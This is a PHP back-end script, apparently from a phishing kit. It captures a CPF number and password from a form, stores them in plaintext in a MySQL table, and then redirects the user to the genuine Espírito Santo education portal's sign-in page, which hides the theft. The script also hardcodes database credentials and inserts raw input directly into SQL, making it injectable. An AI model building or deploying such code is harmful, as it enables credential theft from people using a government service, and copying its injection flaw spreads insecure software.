<?php

ini_set('display_errors', '1');

if (isset($_POST['submit'])) {
    $cpf = $_POST['cpf'];
    $senha = $_POST['senha'];
    echo "Pegou as informações cpf e senha. ";
    
    #-----------------
    $host = 'localhost';
    $user = 'u339952661_5u9GF';  // Corrigido nome da variável para singular
    $db_password = 'samM9624!';
    $db_name = 'u339952661_X5EYC';
    
    echo "1, ";
    
    // Criando a conexão com MySQLi Orientado a Objetos
    $conn = new mysqli($host, $user, $db_password, $db_name);
    
    echo "2, ";
    
    // Verificando se houve erro na conexão
    if ($conn->connect_error){
        echo "Erro ao conectar no banco: " . $conn->connect_error;
        exit();
    }
    
    echo "Conectado com sucesso! ";
    
    #-----------------
    echo "3, ";
    
    // Query para inserir os dados
    $sql = "INSERT INTO users (cpf, senha) VALUES ('$cpf', '$senha')";
    echo "Preparou a query. ";
    
    // Executando a query com $conn->query()
    if ($conn->query($sql) === TRUE) {
        header('Location: https://seges.sedu.es.gov.br/users/sign_in');
    } else {
        echo "Erro: " . $conn->error;  // Exibindo o erro da conexão orientada a objetos
    }
    
    // Fechando a conexão
    $conn->close();
    
} else {
    echo "Nada foi enviado. ";
    header("Location: sign_in.html");
    exit(); // Interrompe o script após o redirecionamento
}

?>
